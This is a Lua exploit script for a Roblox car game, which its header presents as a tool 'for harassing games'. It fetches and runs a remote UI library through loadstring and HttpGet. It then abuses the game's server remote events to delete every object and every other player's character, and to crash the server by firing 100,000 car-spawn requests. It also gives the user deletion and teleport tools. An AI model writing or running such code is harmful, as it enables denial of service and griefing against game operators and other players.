--[[
    FestivalWare.lua

    A script by darraghd493/doge2018 for harassing games.
    This script is free to use and modify, but please give credit to doge2018.

    This script is for a game and is designed to be used by the loader.
]]

local UI = loadstring(game:HttpGet("https://raw.githubusercontent.com/darraghd493/FestivalWare/master/src/ui/UI.lua"))()
local Window = UI:CreateWindow("FestivalWare")
local Server = Window:CreateTab("Server")
local Settings = Window:CreateTab("Settings")

local Workspace = game:GetService("Workspace")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local Mouse = Players.LocalPlayer:GetMouse()

Server:CreateLabel("Destroy")
Server:CreateButton("Destroy Everything", function()
    for i, v in pairs(Workspace:GetChildren()) do
        ReplicatedStorage.DeleteCar:FireServer(v)
    end
    Window:CreateNotification("FestivalWare", "Destroyed everything in the workspace.")
end)

Server:CreateButton("Destroy All Cars", function()
    for i, v in pairs(Workspace:GetChildren()) do
        if string.match(v.Name, "sCar") then
            ReplicatedStorage.DeleteCar:FireServer(v)
        end
    end
    Window:CreateNotification("FestivalWare", "Destroyed all cars in the workspace.")
end)

Server:CreateButton("Destroy All Players", function()
    for i, v in pairs(Players:GetChildren()) do
        ReplicatedStorage.DeleteCar:FireServer(v.Character)
    end
    Window:CreateNotification("FestivalWare", "All players have been destroyed!")
end)

Server:CreateButton("Destroy Other Players", function()
    for i, v in pairs(Players:GetChildren()) do
        if v ~= Players.LocalPlayer then
            ReplicatedStorage.DeleteCar:FireServer(v.Character)
        end
    end
    Window:CreateNotification("FestivalWare", "Other players have been destroyed!")
end)

Server:CreateLabel("Lag")
Server:CreateButton("Mass Request", function()
    for i=1,100000 do
        ReplicatedStorage.SpawnCar:FireServer("BMW M3 GTR (Race)")
    end
    Window:CreateNotification("FestivalWare", "The server has been crashed.")
end)

Server:CreateLabel("Trolling")
Server:CreateButton("Give CarTools", function()
    local Hammer = Instance.new("HopperBin")
    Hammer.Parent = Players.LocalPlayer.Backpack
    Hammer.Name = "Hammer"
    Hammer.BinType = "Script"
    

    Hammer.Selected:Connect(function(input)
        input.Button1Down:Connect(function()
            local part = Mouse.Target
            if part:IsA("BasePart") then
                ReplicatedStorage.DeleteCar:FireServer(part)
            end
        end)
    end)
     
    local NewCar = Instance.new("HopperBin")
    NewCar.Parent = Players.LocalPlayer.Backpack
    NewCar.Name = "New Car"
    NewCar.BinType = "Script"

    NewCar.Selected:Connect(function(input) 
        input.Button1Down:Connect(function()
            local HumanoidRootPart = Players.LocalPlayer.Character.HumanoidRootPart
            local originalCF = HumanoidRootPart.CFrame

            HumanoidRootPart.CFrame = Mouse.Hit + Vector3.new(0, 2, 0)
            wait(0.1)
            ReplicatedStorage.SpawnCar:FireServer("BMW M3 GTR (Race)")
            wait(0.1)
            HumanoidRootPart.CFrame = originalCF
        end)
    end)
     
    local ClickTP = Instance.new("HopperBin")
    ClickTP.Parent = Players.LocalPlayer.Backpack
    ClickTP.Name = "ClickTP"
    ClickTP.BinType = "Script"

    ClickTP.Selected:Connect(function(input) 
        input.Button1Down:Connect(function()
            local HumanoidRootPart = Players.LocalPlayer.Character.HumanoidRootPart
            HumanoidRootPart.CFrame = Mouse.Hit + Vector3.new(0, 2, 0)
        end)
    end)

    Window:CreateNotification("FestivalWare", "CarTools have been given to you.")
end)

Settings:CreateButton("Close", function()
    Window:Close()
end)